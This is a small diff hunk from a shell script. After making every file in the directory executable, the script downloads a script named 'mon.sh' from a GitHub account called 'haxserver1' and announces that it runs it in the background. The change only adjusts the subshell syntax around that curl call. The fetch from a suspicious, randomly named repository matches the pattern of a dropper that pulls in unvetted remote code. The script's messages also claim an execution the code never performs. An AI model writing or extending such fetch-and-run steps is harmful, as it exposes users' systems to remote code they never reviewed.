@@ -71,7 +71,7 @@ chmod +x *
 
 # Execute additional script
 echo "Downloading and executing additional script..."
-if curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh" &); then
+if curl_output=$( (curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh") & ); then
     echo "Script download initiated. Executing in the background..."
 else
     echo "Failed to initiate download or execute additional script using curl."
